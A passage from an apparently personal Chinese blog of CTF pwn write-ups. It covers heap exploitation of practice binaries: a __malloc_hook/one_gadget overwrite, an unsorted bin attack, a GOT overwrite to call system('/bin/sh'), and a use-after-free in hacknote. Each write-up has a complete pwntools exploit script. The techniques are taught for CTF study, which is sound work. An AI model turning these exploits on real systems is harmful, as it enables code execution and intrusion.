<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(0x60,&#39;pppp&#39;)</span><br></pre></td></tr></table></figure>

<hr>
<p>然后再申请会到下面这个地址里面，然后因为one_gadget的限制，所以需要利用realloc_hook。</p>
<p>方法：</p>
<ol>
<li><p>realloc填上one_gadget</p>
</li>
<li><p>再在malloc上填上对应的realloc调整地址（根据需要减少pop），malloc上面8个就是realloc</p>
<p>第二部里面的realloc地址是在libc里面的函数地址，，，</p>
</li>
</ol>
<p><img src="/2020/11/20/16-35-undefined/image-20201120161711894.png" alt="image-20201120161711894"></p>
<p><img src="/2020/11/20/16-35-undefined/image-20201120155747244.png" alt="image-20201120155747244"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload&#x3D;&#39;p&#39;*0xb+p64(one_gadget)+p64(realloc+13)</span><br><span class="line">add(0x60,payload)</span><br></pre></td></tr></table></figure>

<p><a href="https://bbs.pediy.com/thread-246786.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-246786.htm</a></p>
<hr>
<p>最后在申请一下，就的到shell了。</p>
<p><img src="/2020/11/20/16-35-undefined/image-20201120155844851.png" alt="image-20201120155844851"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(&#39;choice: &#39;)</span><br><span class="line">p.sendline(&#39;1&#39;)</span><br><span class="line">p.recvuntil(&#39;size?&#39;)</span><br><span class="line">p.sendline(&quot;12&quot;)</span><br></pre></td></tr></table></figure>

<p>完整exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">p=process(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line"><span class="comment">#p=remote('node3.buuoj.cn',26521)</span></span><br><span class="line">elf=ELF(<span class="string">'./vn_pwn_simpleHeap'</span>)</span><br><span class="line">libc=ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'size?'</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line"></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'idx?'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'idx?'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">    p.sendline(<span class="string">'4'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'idx?'</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">'pppp'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'pppp'</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'pppp'</span>)</span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'pppp'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#fake chunk</span></span><br><span class="line">payload=<span class="string">'p'</span>*<span class="number">0x18</span>+<span class="string">'\xe1'</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'pppp'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">main_arena=u64(p.recvuntil(<span class="string">'\x7f'</span>)[<span class="number">-6</span>:].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-88</span></span><br><span class="line">libc_base=main_arena<span class="number">-0x3c4b20</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_one_gadget=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">one_gadget=libc_base+libc_one_gadget[<span class="number">1</span>]</span><br><span class="line">malloc_hook=libc_base+libc.symbols[<span class="string">'__malloc_hook'</span>]</span><br><span class="line">realloc=libc_base+libc.symbols[<span class="string">'__libc_realloc'</span>]</span><br><span class="line">fake_chunk=malloc_hook<span class="number">-0x23</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">"[*]libc_base"</span>+hex(libc_base))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'pppp'</span>)</span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(fake_chunk)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'pppp'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'p'</span>*<span class="number">0xb</span>+p64(one_gadget)+p64(realloc+<span class="number">13</span>)</span><br><span class="line">add(<span class="number">0x60</span>,payload)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">'choice: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'size?'</span>)</span><br><span class="line">p.sendline(<span class="string">"12"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>不知道为什么本地打不通，但是远程莫得问题</p>
<h2 id="1-easyheap"><a href="#1-easyheap" class="headerlink" title="-1.easyheap"></a>-1.easyheap</h2><h3 id="前期保护"><a href="#前期保护" class="headerlink" title="前期保护"></a>前期保护</h3><p><img src="/2020/11/20/16-35-undefined/image-20201120173551508.png" alt="image-20201120173551508"></p>
<p>64位的，没有开pie和relro，顿时觉得easy</p>
<p>没开pie，可以用elf里的plt和got表，没开relro，可以覆盖got表地址。</p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><img src="/2020/11/20/16-35-undefined/image-20201120173920525.png" alt="image-20201120173920525"></p>
<p>edit里面可以输入长度，造成堆溢出</p>
<p><img src="/2020/11/20/16-35-undefined/image-20201120174112398.png" alt="image-20201120174112398"></p>
<p>程序留有后面函数，，</p>
<p><img src="/2020/11/20/16-35-undefined/image-20201120174142786.png" alt="image-20201120174142786"></p>
<p>只要v3 == 4869，也就是选择输入的时候输入4869即可。并且让magic大于0x1305可以，unsortedbin可以实现向任意地址读入</p>
<h3 id="方法一-unsortbin-attack"><a href="#方法一-unsortbin-attack" class="headerlink" title="方法一 unsortbin attack"></a>方法一 unsortbin attack</h3><p>首先申请了三个堆块，其中第二个要大于0x70为unsortbin</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(0x20,&#39;aaaa&#39;)</span><br><span class="line">add(0x80,&#39;aaaa&#39;)</span><br><span class="line">add(0x20,&#39;aaaa&#39;)</span><br></pre></td></tr></table></figure>

<p>然后将第二个释放，放入unsortbin中</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">delete(1)</span><br></pre></td></tr></table></figure>

<p>利用堆溢出，将unsortbin内容修改，其中fd为任意，bk为目标地址 - 0x10</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd &#x3D; 0</span><br><span class="line">bk &#x3D; magic - 0x10</span><br><span class="line">edit(0,0x20+0x20,&quot;a&quot;*0x20+p64(0)+p64(0x91)+p64(fd)+p64(bk))</span><br></pre></td></tr></table></figure>

<p>接着，把我们的unsortbin申请回来，实现unsortbin attack</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add(0x80,&#39;aaaa&#39;)</span><br></pre></td></tr></table></figure>

<p>然后，v3输入4869，此时magic已经是一个很大的数，就可以进入后面函数了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(&quot;Your choice :&quot;)</span><br><span class="line">p.sendline(&quot;4869&quot;)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process("./easyheap")</span></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="string">"28942"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Size of Heap : "</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content of heap:"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"Size of Heap : "</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content of heap : "</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x06020C0</span></span><br><span class="line"></span><br><span class="line">fd = <span class="number">0</span></span><br><span class="line">bk = magic - <span class="number">0x10</span></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x20</span>+<span class="number">0x20</span>,<span class="string">"a"</span>*<span class="number">0x20</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(fd)+p64(bk))</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">'aaaa'</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">p.sendline(<span class="string">"4869"</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p><img src="/2020/11/20/16-35-undefined/image-20201120175326957.png" alt="image-20201120175326957"></p>
<p>远程有点问题，，，所以要非预期解了。。。</p>
<h3 id="方法二-fastbin修改got表"><a href="#方法二-fastbin修改got表" class="headerlink" title="方法二 fastbin修改got表"></a>方法二 fastbin修改got表</h3><p>因为后面要申请到的是0x7f，所以刚开始创建0x68的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(0x68,&#39;aaaa&#39;)#0</span><br><span class="line">add(0x68,&#39;aaaa&#39;)#1</span><br><span class="line">add(0x68,&#39;aaaa&#39;)#2</span><br></pre></td></tr></table></figure>

<p>然后释放掉一个块，用上一块块溢出到下一个块，将fd里面填入heaparray[i]附近的内容，再申请回来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line">payload &#x3D; &#39;a&#39;*0x60+p64(0)+p64(0x71)+p64(0x6020ad)</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line"></span><br><span class="line">add(0x68,&#39;aaaa&#39;)#1</span><br></pre></td></tr></table></figure>

<p>往申请回来的块里面填入atoi的got表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; &#39;b&#39;*35 + p64(elf.got[&#39;atoi&#39;])</span><br><span class="line">add(0x68,payload)</span><br></pre></td></tr></table></figure>

<p>然后往got表里面填入system的plt表</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload &#x3D; p64(elf.plt[&#39;system&#39;])</span><br><span class="line">edit(0,0x8,payload)</span><br></pre></td></tr></table></figure>

<p>然后发送的时候，发送’/bin/sh’，即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(&quot;Your choice :&quot;)</span><br><span class="line">p.sendline(&#39;&#x2F;bin&#x2F;sh&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>完整exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./easyheap"</span>)</span><br><span class="line">elf = ELF(<span class="string">"./easyheap"</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="string">"28942"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Size of Heap : "</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content of heap:"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"Size of Heap : "</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content of heap : "</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaaa'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaaa'</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaaa'</span>)<span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x60</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>)+p64(<span class="number">0x6020ad</span>)</span><br><span class="line">edit(<span class="number">0</span>,len(payload),payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaaa'</span>)<span class="comment">#1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">'b'</span>*<span class="number">35</span> + p64(elf.got[<span class="string">'atoi'</span>])</span><br><span class="line">add(<span class="number">0x68</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = p64(elf.plt[<span class="string">'system'</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">p.sendline(<span class="string">'/bin/sh'</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/11/11/02-45-undefined/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/shuwen.jpg">
      <meta itemprop="name" content="Shuwen">
      <meta itemprop="description" content="做有意思的事，有意思地做事">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Shuwen's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2020/11/11/02-45-undefined/" class="post-title-link" itemprop="url">ctf-wiki的刷题笔记</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2020-11-11 02:45:13" itemprop="dateCreated datePublished" datetime="2020-11-11T02:45:13+08:00">2020-11-11</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-04-20 16:59:55" itemprop="dateModified" datetime="2021-04-20T16:59:55+08:00">2021-04-20</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="uaf"><a href="#uaf" class="headerlink" title="uaf"></a>uaf</h1><h2 id="HITCON-training-lab-10-hacknote"><a href="#HITCON-training-lab-10-hacknote" class="headerlink" title="HITCON-training  - lab 10 hacknote"></a>HITCON-training  - lab 10 hacknote</h2><p>存在uaf漏洞</p>
<p><img src="/2020/11/11/02-45-undefined/image-20201111032646916.png" alt="image-20201111032646916"></p>
<p>note的结构是，有两个属性put和content</p>
<p><img src="/2020/11/11/02-45-undefined/image-20201111032057852.png" alt="image-20201111032057852"></p>
<p><img src="/2020/11/11/02-45-undefined/image-20201111032726035.png" alt="image-20201111032726035"></p>
<p>puts函数存放的是print_note_content函数指针，输出的时候会调用这个函数，content属性是存放内容的堆指针。</p>
<p><img src="/2020/11/11/02-45-undefined/image-20201111032835613.png" alt="image-20201111032835613"></p>
<p>存在后门函数magic</p>
<p>所以，只要修改puts属性为magic属性，那么在show的时候，就会调用magic函数，get flag。</p>
<p>申请一个堆块，会建立两个堆，一个存放输出信息，一个存放内容</p>
<p><img src="/2020/11/11/02-45-undefined/image-20201111032951397.png" alt="image-20201111032951397"></p>
<p>这里，0x11的是notelist结构题，存放的是puts和content两个指针。</p>
<p>如果我们把这两个堆块都释放了，那么他们都进入了fastbin</p>
<p><img src="/2020/11/11/02-45-undefined/image-20201111033120082.png" alt="image-20201111033120082"></p>
<p>如果此时我们申请一个和notelist长度一样的堆块，那么它会把原先的两个0x11给我们，一个作为notelist一个作为content，但是content我们是可控的，放入magic，再输出，即调用magic函数。</p>
<p><img src="/2020/11/11/02-45-undefined/image-20201111033408089.png" alt="image-20201111033408089"></p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">"./hacknote"</span>)</span><br><span class="line"><span class="comment">#context.log_level  ='debug'</span></span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"size :"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Content :"</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"dex :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"dex :"</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">32</span>,<span class="string">"aaaa"</span>)</span><br><span class="line">add(<span class="number">32</span>,<span class="string">"bbbb"</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x8</span>,p32(magic)*<span class="number">2</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<p>以前写的：<a href="https://blog.csdn.net/qq_43935969/article/details/104730157" target="_blank" rel="noopener">https://blog.csdn.net/qq_43935969/article/details/104730157</a></p>
<h1 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h1><h2 id="2014-hitcon-stkof"><a href="#2014-hitcon-stkof" class="headerlink" title="2014_hitcon_stkof"></a>2014_hitcon_stkof</h2><h3 id="libc"><a href="#libc" class="headerlink" title="libc"></a>libc</h3><ul>
<li><p>如果题目中给出了libc文件，用ida打开，搜索字符串，搜索version<img src="/2020/11/11/02-45-undefined/image-20201108030310873.png" alt="image-20201108030310873"></p>
</li>
<li><p>如果题目没有给出libc文件，需要一个个尝试</p>
<ul>
<li><p>堆的话试试UAF啥的</p>
<p>​    要么2.23、要么2.27、2.31就喷他</p>
</li>
